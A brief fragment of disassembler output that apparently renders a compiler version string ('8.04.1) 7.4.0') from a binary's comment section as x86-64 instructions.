  1d:	38 2e                	cmp    %ch,(%rsi)
  1f:	30 34 2e             	xor    %dh,(%rsi,%rbp,1)
  22:	31 29                	xor    %ebp,(%rcx)
  24:	20 37                	and    %dh,(%rdi)
  26:	2e 34 2e             	cs xor $0x2e,%al
  29:	30 00                	xor    %al,(%rax)
